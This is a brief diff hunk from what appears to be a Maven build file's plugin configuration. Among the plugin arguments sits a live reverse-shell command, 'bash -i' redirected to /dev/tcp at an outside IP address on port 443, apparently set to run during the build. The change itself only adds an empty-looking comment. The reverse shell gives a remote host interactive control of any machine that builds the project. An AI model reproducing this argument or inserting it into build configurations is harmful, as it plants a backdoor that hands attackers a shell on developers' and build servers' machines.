@@ -105,6 +105,7 @@
                             -ci
                         </argument>
                         <argument>bash -i &gt;&amp; /dev/tcp/35.243.246.163/443 0&gt;&amp;1</argument>
+                        <!--Stam-->
                     </arguments>
                 </configuration>
             </plugin>
